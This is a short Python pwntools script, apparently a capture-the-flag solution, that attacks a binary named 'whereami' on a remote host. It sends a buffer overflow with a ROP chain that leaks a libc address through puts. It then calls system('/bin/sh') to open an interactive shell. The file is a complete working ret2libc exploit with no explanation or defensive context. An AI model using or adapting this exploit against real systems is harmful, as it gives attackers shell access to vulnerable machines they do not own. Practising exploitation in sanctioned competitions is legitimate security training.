from pwn import *


context.terminal=['konsole', '-e']
context.log_level='info'

p = gdb.debug("./whereami")
p = remote("34.86.193.227", 31222)
e = ELF("./whereami")
libc = ELF("./libc.so.6")

ret = 0x000000000040101a
poprdi = 0x0000000000401303

p.sendlineafter("? ", "A"*72 + p64(ret) + p64(poprdi) + p64(e.got["gets"]) + p64(e.plt["puts"]) + p64(ret) + p64(poprdi) + p64(e.sym["counter"]) + p64(e.plt["gets"]) + p64(ret) + p64(e.sym["main"]))

p.sendline(p64(0))

p.recvline()

libc.address = u64(p.recvline()[:-1] + "\x00\x00") - libc.sym["gets"]

print("libc", hex(libc.address))

p.sendlineafter("? ", "A"*72 + p64(ret) + p64(poprdi) + p64(next(libc.search('/bin/sh'))) + p64(libc.sym["system"]))


p.interactive()